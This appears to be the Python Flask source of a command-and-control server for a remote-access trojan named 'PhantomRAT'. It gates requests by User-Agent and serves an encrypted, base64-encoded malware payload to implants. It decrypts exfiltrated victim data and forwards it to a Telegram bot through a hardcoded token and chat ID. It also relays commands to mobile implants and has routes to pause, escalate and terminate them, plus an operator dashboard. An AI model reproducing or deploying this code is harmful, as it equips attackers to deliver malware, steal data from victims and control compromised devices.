from flask import Flask, request, jsonify, Response
import base64
import json
import os
from cryptography.fernet import Fernet
import telegram
import asyncio
import random

app = Flask(__name__)

# Load malleable profile
with open('malleable_profile.json', 'r') as f:
    profile = json.load(f)

key = profile['encryption']['key'].encode()
fernet = Fernet(base64.urlsafe_b64encode(key.ljust(32)[:32]))

# Telegram bot
BOT_TOKEN = "8441637477:AAF4yVWTmXniWE8WYdkLiS5WAsd0vE43qk4"
CHAT_ID = "7279310150"
bot = telegram.Bot(token=BOT_TOKEN)

async def send_notification(message):
    await bot.send_message(chat_id=CHAT_ID, text=message)

def encrypt_data(data):
    return fernet.encrypt(json.dumps(data).encode()).decode()

def decrypt_data(data):
    return json.loads(fernet.decrypt(data.encode()).decode())

@app.route(profile['http-get']['client']['uri'], methods=[profile['http-get']['client']['verb']])
def get_payload():
    # Check for custom header or something
    if request.headers.get('User-Agent') != profile['http-get']['client']['header']['User-Agent']:
        return Response("Not Found", status=404)
    
    # Serve the encrypted base64 encoded main malware
    with open('nezrimyy_main.py', 'r') as f:
        code = f.read()
    encoded = base64.b64encode(code.encode()).decode()
    if profile['http-get']['server']['output']['base64']:
        response = encrypt_data({'payload': encoded})
    else:
        response = encoded
    return Response(response, headers=profile['http-get']['server']['header'])

@app.route(profile['http-post']['client']['uri'], methods=[profile['http-post']['client']['verb']])
def exfil():
    if request.headers.get('User-Agent') != profile['http-post']['client']['header']['User-Agent']:
        return Response("Not Found", status=404)
    
    encrypted_data = request.get_data().decode()
    data = decrypt_data(encrypted_data)
    print("Exfiltrated data:", data)
    # Send notification
    asyncio.run(send_notification(f"New exfil data: {json.dumps(data)}"))
    # Store or process
    return Response(jsonify({"status": "received"}), headers=profile['http-post']['server']['header'])

@app.route('/command', methods=['POST'])
def command():
    cmd_data = decrypt_data(request.get_data().decode())
    cmd = cmd_data.get('cmd')
    print("Received command:", cmd)
    asyncio.run(send_notification(f"Command executed: {cmd}"))
    # For mobile, send command back
    response = encrypt_data({"cmd": cmd, "recipient": cmd_data.get('recipient'), "message": cmd_data.get('message'), "number": cmd_data.get('number'), "data": cmd_data.get('data')})
    return Response(response)

@app.route('/upload_task', methods=['POST'])
def upload_task():
    task_data = request.json
    # Upload to Drive as task file
    filename = f"task_{random.randint(1000,9999)}.json"
    # Simulate upload
    asyncio.run(send_notification(f"Task uploaded: {task_data}"))
    return jsonify({"status": "task uploaded"})

@app.route('/upload_module', methods=['POST'])
def upload_module():
    module_code = request.data.decode()
    # Encrypt and upload to Drive
    asyncio.run(send_notification("Module uploaded"))
    return jsonify({"status": "module uploaded"})

@app.route('/logs', methods=['GET'])
def get_logs():
    # Return logs, placeholder
    return jsonify({"logs": ["log1", "log2"]})

@app.route('/pause_implant', methods=['POST'])
def pause_implant():
    implant_id = request.json.get('implant_id')
    asyncio.run(send_notification(f"Paused implant: {implant_id}"))
    # Logic to pause
    return jsonify({"status": "paused"})

@app.route('/escalate', methods=['POST'])
def escalate():
    implant_id = request.json.get('implant_id')
    level = request.json.get('level')
    asyncio.run(send_notification(f"Escalated implant {implant_id} to {level}"))
    # Logic
    return jsonify({"status": "escalated"})

@app.route('/terminate', methods=['POST'])
def terminate():
    implant_id = request.json.get('implant_id')
    asyncio.run(send_notification(f"Terminated implant: {implant_id}"))
    # Logic
    return jsonify({"status": "terminated"})

@app.route('/dashboard', methods=['GET'])
def dashboard():
    html = """
    <html>
    <head><title>PhantomRAT C2 Dashboard</title></head>
    <body>
    <h1>PhantomRAT Controller Dashboard</h1>
    <p>Active Implants: 1</p>
    <p>Tasks Issued: 0</p>
    <h2>Issue Task</h2>
    <form method="post" action="/upload_task">
    <input type="text" name="implant_id" placeholder="Implant ID">
    <input type="text" name="cmd" placeholder="Command">
    <input type="text" name="args" placeholder="Args">
    <button type="submit">Send Task</button>
    </form>
    <h2>Control Implants</h2>
    <form method="post" action="/pause_implant">
    <input type="text" name="implant_id" placeholder="Implant ID">
    <button type="submit">Pause</button>
    </form>
    <form method="post" action="/escalate">
    <input type="text" name="implant_id" placeholder="Implant ID">
    <input type="text" name="level" placeholder="Level">
    <button type="submit">Escalate</button>
    </form>
    <form method="post" action="/terminate">
    <input type="text" name="implant_id" placeholder="Implant ID">
    <button type="submit">Terminate</button>
    </form>
    <h2>Logs</h2>
    <pre>Placeholder logs</pre>
    </body>
    </html>
    """
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)